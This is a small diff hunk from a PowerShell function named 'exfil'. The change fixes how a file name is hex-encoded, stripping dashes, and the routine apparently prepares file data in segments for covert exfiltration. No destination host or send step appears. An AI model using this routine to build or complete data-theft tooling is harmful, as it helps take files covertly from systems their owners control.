@@ -41,7 +41,7 @@ function exfil {
 			# Generate a random hex string of 8-16 characters for the first segment
 			$hexExt = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($ext)).Replace('-', '')
 
-			$hexName = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($saveAs))
+			$hexName = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($saveAs)).Replace('-', '')
 
 			# Randomly select a separator for the total number of segments
 			$totalSeparator = 'H'
